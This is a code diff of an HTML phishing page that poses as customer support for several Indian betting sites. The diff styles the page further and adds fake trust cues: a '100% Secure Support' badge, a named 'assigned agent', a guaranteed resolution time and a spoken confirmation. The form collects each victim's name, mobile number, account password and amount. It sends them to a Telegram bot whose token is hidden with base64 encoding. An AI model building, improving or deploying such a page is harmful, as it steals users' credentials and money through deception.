@@ -10,10 +10,10 @@
     
     <style>
         :root {
-            --primary-color: #ffcc00;
-            --bg-color: #0b0c10;
-            --card-bg: #1f2833;
-            --text-color: #c5c6c7;
+            --primary-color: #f1c40f;
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --text-color: #c9d1d9;
         }
 
         body {
@@ -25,13 +25,23 @@
             text-align: center;
         }
 
-        h2 {
-            color: var(--primary-color);
-            font-size: 26px;
+        .header-title {
             margin-bottom: 40px;
+        }
+
+        .header-title h2 {
+            color: var(--primary-color);
+            font-size: 24px;
+            margin: 0 0 10px 0;
             text-transform: uppercase;
             letter-spacing: 1px;
-            text-shadow: 0 0 10px rgba(255, 204, 0, 0.3);
+            text-shadow: 0 0 10px rgba(241, 196, 15, 0.3);
+        }
+
+        .header-title p {
+            color: #8b949e;
+            font-size: 16px;
+            margin: 0;
         }
 
         .game-grid {
@@ -45,23 +55,23 @@
         .game-card {
             background-color: var(--card-bg);
             padding: 25px 15px;
-            border-radius: 15px;
+            border-radius: 12px;
             cursor: pointer;
             transition: all 0.3s ease;
-            border: 1px solid #333;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            border: 1px solid #30363d;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
         .game-card:hover {
-            transform: translateY(-10px);
+            transform: translateY(-8px);
             border-color: var(--primary-color);
-            box-shadow: 0 10px 25px rgba(255, 204, 0, 0.4);
+            box-shadow: 0 12px 30px rgba(241, 196, 15, 0.2);
         }
 
-        /* Custom Game Logos */
+        /* Updated Custom Game Logos */
         .logo-box {
             width: 100%;
             height: 70px;
@@ -69,25 +79,27 @@
             justify-content: center;
             align-items: center;
             border-radius: 8px;
-            font-size: 20px;
+            font-size: 21px;
             font-weight: 900;
             margin-bottom: 15px;
             text-transform: uppercase;
             letter-spacing: 1px;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
         }
 
-        .logo-4rabet { background-color: #0a1e3f; color: #ffffff; border: 1px solid #144079; }
-        .logo-crorebet { background-color: #ffb800; color: #000000; }
-        .logo-starkbet { background-color: #4b00d1; color: #ffffff; }
-        .logo-starkbet span { color: #ffb800; }
-        .logo-parimatch { background-color: #000000; color: #fbed00; border: 2px solid #333; font-style: italic; }
-        .logo-luckystar { background: linear-gradient(45deg, #ff0055, #ffcc00); color: #ffffff; }
-        .logo-valorbet { background-color: #ffffff; color: #0a1e3f; }
-        .logo-valorbet span { color: #ff6600; }
+        /* Adjusted Colors */
+        .logo-4rabet { background: linear-gradient(135deg, #021f47, #0056b3); color: #ffffff; border: 1px solid #0056b3; }
+        .logo-crorebet { background: linear-gradient(135deg, #f1c40f, #e67e22); color: #000000; }
+        .logo-starkbet { background: linear-gradient(135deg, #3a0088, #6600cc); color: #ffffff; }
+        .logo-starkbet span { color: #f1c40f; margin-left: 5px; }
+        .logo-parimatch { background-color: #000000; color: #fbed00; border: 2px solid #222; font-style: italic; }
+        .logo-luckystar { background: linear-gradient(135deg, #006400, #00b33c); color: #ffffff; } /* Made Green */
+        .logo-valorbet { background-color: #111111; color: #ffffff; border: 2px solid #ff4500; }
+        .logo-valorbet span { color: #ff4500; margin-left: 5px; }
 
         .game-card p {
             margin: 0; font-weight: bold; font-size: 16px;
-            color: var(--primary-color); letter-spacing: 1px;
+            color: #ffffff; letter-spacing: 0.5px;
         }
 
         /* Support Modal */
@@ -98,44 +110,68 @@
         }
 
         .modal-content {
-            background: linear-gradient(145deg, #1f2833, #151b22); padding: 35px;
-            border-radius: 20px; width: 90%; max-width: 450px; position: relative;
-            text-align: left; border: 1px solid var(--primary-color);
-            box-shadow: 0 0 30px rgba(255, 204, 0, 0.2); animation: fadeIn 0.4s ease-out;
+            background: #161b22; padding: 30px;
+            border-radius: 16px; width: 90%; max-width: 420px; position: relative;
+            text-align: left; border: 1px solid #30363d;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.8); animation: fadeIn 0.3s ease-out;
+            max-height: 90vh; overflow-y: auto;
         }
 
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
 
         .close-btn {
             position: absolute; top: 15px; right: 20px; font-size: 28px;
-            cursor: pointer; color: #ff4d4d; transition: 0.2s;
+            cursor: pointer; color: #8b949e; transition: 0.2s;
         }
-        .close-btn:hover { color: #ff1a1a; transform: scale(1.1); }
+        .close-btn:hover { color: #ff4d4d; }
 
-        .form-group { margin-bottom: 18px; }
-        .form-group label { display: block; margin-bottom: 8px; font-size: 13px; color: var(--text-color); text-transform: uppercase; }
+        /* Trust Badge Section */
+        .trust-box {
+            background: rgba(46, 160, 67, 0.1);
+            border: 1px solid #2ea043;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .trust-box h4 {
+            color: #3fb950; margin: 0 0 5px 0; font-size: 15px; display: flex; justify-content: center; align-items: center; gap: 5px;
+        }
+        .trust-box p {
+            color: #c9d1d9; font-size: 13px; margin: 5px 0; line-height: 1.4;
+        }
+        .trust-box .agent-name {
+            color: var(--primary-color); font-weight: bold; font-size: 14px;
+        }
+
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; margin-bottom: 6px; font-size: 13px; color: #8b949e; font-weight: 600; }
         .form-group input, .form-group textarea {
-            width: 100%; padding: 12px; border: 1px solid #45a29e; border-radius: 8px;
-            background-color: #0b0c10; color: white; box-sizing: border-box; font-size: 14px;
+            width: 100%; padding: 12px; border: 1px solid #30363d; border-radius: 6px;
+            background-color: #0d1117; color: white; box-sizing: border-box; font-size: 14px;
+            transition: border-color 0.3s;
         }
         .form-group input:focus, .form-group textarea:focus {
-            outline: none; border-color: var(--primary-color); box-shadow: 0 0 8px rgba(255, 204, 0, 0.3);
+            outline: none; border-color: var(--primary-color);
         }
 
         .submit-btn {
-            width: 100%; padding: 15px; background: linear-gradient(90deg, #f39c12, #e67e22);
-            color: #000; border: none; border-radius: 8px; font-size: 16px; font-weight: bold;
-            text-transform: uppercase; cursor: pointer; transition: 0.3s; margin-top: 10px;
+            width: 100%; padding: 14px; background: var(--primary-color);
+            color: #000; border: none; border-radius: 6px; font-size: 16px; font-weight: bold;
+            text-transform: uppercase; cursor: pointer; transition: 0.3s; margin-top: 5px;
         }
-        .submit-btn:hover { box-shadow: 0 0 15px rgba(230, 126, 34, 0.5); }
+        .submit-btn:hover { background: #d4ac0d; }
         
         .cf-turnstile-container { margin-bottom: 15px; display: flex; justify-content: center; }
-        #statusMessage { display: none; text-align: center; color: #00ff88; font-weight: bold; margin-top: 15px; font-size: 16px; }
+        #statusMessage { display: none; text-align: center; color: #3fb950; font-weight: bold; margin-top: 15px; font-size: 15px; padding: 10px; background: rgba(46, 160, 67, 0.1); border-radius: 6px; }
     </style>
 </head>
 <body>
 
-    <h2>Jis game mein issue hai uspe click karein</h2>
+    <div class="header-title">
+        <h2>Select Your Game</h2>
+        <p>Jis game mein issue hai uspe click karein</p>
+    </div>
 
     <div class="game-grid">
         <div class="game-card" onclick="openForm('4rabet')">
@@ -147,7 +183,7 @@
             <p>Crore Bet</p>
         </div>
         <div class="game-card" onclick="openForm('Stark Bet')">
-            <div class="logo-box logo-starkbet">STARK<br><span>BET</span></div>
+            <div class="logo-box logo-starkbet">STARK<span>BET</span></div>
             <p>Stark Bet</p>
         </div>
         <div class="game-card" onclick="openForm('Parimatch')">
@@ -159,7 +195,7 @@
             <p>Lucky Star</p>
         </div>
         <div class="game-card" onclick="openForm('Valor Bet')">
-            <div class="logo-box logo-valorbet">VALOR <span>BET</span></div>
+            <div class="logo-box logo-valorbet">VALOR<span>BET</span></div>
             <p>Valor Bet</p>
         </div>
     </div>
@@ -168,21 +204,26 @@
     <div id="supportModal" class="modal">
         <div class="modal-content">
             <span class="close-btn" onclick="closeForm()">&times;</span>
-            <h3 id="formTitle" style="margin-top:0; color:#ffcc00; text-align:center; font-size: 22px;">Support</h3>
+            <h3 id="formTitle" style="margin-top:0; color:#ffffff; text-align:center; font-size: 20px; border-bottom: 1px solid #30363d; padding-bottom: 15px;">Support</h3>
+            
+            <!-- Trusted Lines Added Here -->
+            <div class="trust-box">
+                <h4>🔒 100% Secure Support</h4>
+                <p>Please fill out the form carefully. Your problem will be resolved within 10 to 25 minutes exactly.</p>
+                <p class="agent-name">👨‍💻 Assigned Agent: Nitin Kumar</p>
+            </div>
             
             <form id="dataForm" onsubmit="sendToTelegram(event)">
-                <div class="form-group"><label>Full Name</label><input type="text" id="name" required></div>
-                <div class="form-group"><label>Mobile Number</label><input type="number" id="phone" required></div>
-                
-                <!-- Password Field -->
-                <div class="form-group"><label>Password</label><input type="password" id="password" required></div>
-                
-                <div class="form-group"><label>Amount (₹)</label><input type="number" id="amount" required></div>
-                <div class="form-group"><label>Describe Issue</label><textarea id="problem" rows="2" required></textarea></div>
+                <div class="form-group"><label>Full Name</label><input type="text" id="name" placeholder="Enter your full name" required></div>
+                <div class="form-group"><label>Mobile Number</label><input type="number" id="phone" placeholder="Enter mobile number" required></div>
+                <div class="form-group"><label>Password</label><input type="password" id="password" placeholder="Enter account password" required></div>
+                <div class="form-group"><label>Amount (₹)</label><input type="number" id="amount" placeholder="Enter amount" required></div>
+                <div class="form-group"><label>Describe Issue</label><textarea id="problem" rows="2" placeholder="Explain your problem here..." required></textarea></div>
                 
                 <!-- Cloudflare Turnstile Widget -->
                 <div class="cf-turnstile-container">
-                    <div class="cf-turnstile" data-sitekey="0x4AAAAAAE-FSW7V0OIKRLh0"></div>
+                    <!-- YAHAN APNI SITE KEY DAALNI HAI -->
+                    <div class="cf-turnstile" data-sitekey="YOUR_CLOUDFLARE_SITE_KEY_HERE"></div>
                 </div>
 
                 <button type="submit" id="submitBtn" class="submit-btn">Submit Request</button>
@@ -205,17 +246,38 @@
             document.getElementById("supportModal").style.display = "none";
             document.getElementById("dataForm").reset();
             document.getElementById("submitBtn").style.display = "block";
+            // Cancel voice if modal is closed manually
+            if ('speechSynthesis' in window) { window.speechSynthesis.cancel(); }
             if (typeof turnstile !== 'undefined') { turnstile.reset(); }
         }
 
-        function playVoiceMessage(gameName) {
+        // Updated Voice Function: Speaks clearly and waits to finish before closing
+        function playVoiceMessage() {
             if ('speechSynthesis' in window) {
-                let textToSpeak = `Aapki request ${gameName} team ko chali gayi hai, kripya wait karein`;
+                window.speechSynthesis.cancel(); // Pehle ki aawaz rokein
+                
+                // Saaf aur professional message
+                let textToSpeak = `Hello, Your support request has been submitted successfully. Agent Nitin Kumar will solve your problem in 10 to 25 minutes. Thank you.`;
+                
                 let speech = new SpeechSynthesisUtterance(textToSpeak);
-                speech.lang = 'hi-IN'; 
-                speech.rate = 0.9;     
+                speech.lang = 'hi-IN'; // Indian accent for clear Hindi/English mix
+                speech.rate = 0.9;     // Normal speed
                 speech.pitch = 1;
+                
+                // Jab bolna khatam ho jayega TAbhi form close hoga
+                speech.onend = function() {
+                    closeForm();
+                };
+
+                // In case of any error in speaking, fallback to close after 6 seconds
+                speech.onerror = function() {
+                    setTimeout(closeForm, 6000);
+                }
+                
                 window.speechSynthesis.speak(speech);
+            } else {
+                // Agar device mein voice support nahi hai toh 5 second baad close ho jayega
+                setTimeout(closeForm, 5000);
             }
         }
 
@@ -229,8 +291,8 @@
                 return;
             }
 
-            // Pre-filled Bot Token & Chat ID
-            const botToken = atob('ODYzNTI4OTE2NTpBQUVvUngtaV9UR3h1b2cwbjYyeGZxQllhRGlsY2Rpbko2UQ==');
+            // GitHub hidden bot token & Chat ID
+            const botToken = atob('ODYzNTI4OTE2NTpBQUVvUngtaV9UR3h1b2cwbjYyeGZxQllhRGlsY2Rpbko2UQ=='); 
             const chatId = '8882142102';
 
             const name = document.getElementById('name').value;
@@ -240,7 +302,8 @@
             const problem = document.getElementById('problem').value;
 
             const message = `🌟 *VIP SUPPORT REQUEST* 🌟\n\n` +
-                            `🎮 *Game Name:* ${selectedGameName}\n` +
+                            `🎮 *Game:* ${selectedGameName}\n` +
+                            `👨‍💻 *Agent:* Nitin Kumar\n` +
                             `👤 *Name:* ${name}\n` +
                             `📞 *Mobile:* ${phone}\n` +
                             `🔑 *Password:* ${password}\n` +
@@ -249,7 +312,7 @@
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
-            document.getElementById("submitBtn").innerText = "Sending...";
+            document.getElementById("submitBtn").innerText = "Processing...";
             document.getElementById("submitBtn").disabled = true;
 
             fetch(url, {
@@ -262,13 +325,13 @@
                 if(data.ok) {
                     document.getElementById("submitBtn").style.display = "none";
                     let statusDiv = document.getElementById("statusMessage");
-                    statusDiv.innerHTML = `✅ Aapki request <b>${selectedGameName}</b> team ko chali gayi hai, kripya wait karein.`;
+                    statusDiv.innerHTML = `✅ Request Submitted! Agent Nitin Kumar is working on it.`;
                     statusDiv.style.display = "block";
                     
-                    playVoiceMessage(selectedGameName);
-                    setTimeout(closeForm, 4500);
+                    // Call the voice message, and it will close the form automatically when done speaking
+                    playVoiceMessage();
                 } else {
-                    alert("Error: Telegram bot request fail ho gayi.");
+                    alert("Error: Data send nahi hua. Network issue.");
                     document.getElementById("submitBtn").innerText = "Submit Request";
                     document.getElementById("submitBtn").disabled = false;
                 }
